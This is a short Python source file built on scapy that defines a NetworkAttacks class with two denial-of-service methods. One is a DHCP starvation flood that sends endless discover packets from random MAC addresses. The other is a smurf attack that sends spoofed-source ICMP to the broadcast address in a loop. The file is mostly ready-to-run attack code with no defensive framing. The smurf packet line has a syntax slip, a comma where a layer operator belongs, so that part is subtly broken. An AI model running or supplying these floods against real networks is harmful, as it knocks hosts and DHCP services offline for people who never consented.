from scapy.all import *
import threading

class NetworkAttacks():
	"""docstring for NetworkAttacks"""
	def __init__(self):
		pass

	def DHCP_starvation(self):#starving the dhcp server nearb
		conf.checkIPaddr = False
		dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
		sendp(dhcp_discover,loop=1)

	def smurf_attack(self,component):#smurfing the vitctim ip
		victim_ip = component.ip
		print str(victim_ip) + ' is smurfed'
		smurf_packet =  Ether(src=RandMAC()),IP(src=victim_ip,dst="255.255.255.255")/ICMP()
		threading.Thread(target=sendp, args=(smurf_packet,),kwargs ={"loop":1}).start()
		# threading.Thread(target=sendp, args=(smurf_packet,),kwargs ={"loop":1}).start()
		# threading.Thread(target=sendp, args=(smurf_packet,),kwargs ={"loop":1}).start()
		# threading.Thread(target=sendp, args=(smurf_packet,),kwargs ={"loop":1}).start()
		# threading.Thread(target=sendp, args=(smurf_packet,),kwargs ={"loop":1}).start()
		# sendp(smurf_packet,loop=1)